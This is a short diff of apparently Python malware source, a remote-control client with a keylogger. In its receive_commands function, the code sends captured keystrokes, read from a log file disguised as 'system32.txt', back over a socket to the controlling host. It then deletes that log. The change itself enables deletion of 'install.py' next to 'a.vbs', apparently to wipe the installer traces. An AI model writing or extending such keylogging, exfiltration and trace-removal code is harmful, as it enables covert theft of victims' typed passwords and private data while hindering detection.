@@ -111,7 +111,7 @@ def receive_commands():
             s.send(str.encode("loged so far:" + read_file("system32.txt") + "\n[-Key loger Stoped]" + str(os.getcwd()) + '>end'))
             delete_file("system32.txt")
             print("Obrisao 1")
-            #delete_file("install.py")
+            delete_file("install.py")
             print("Obrisao 2")
             delete_file("a.vbs")
             print("Obrisao 3")
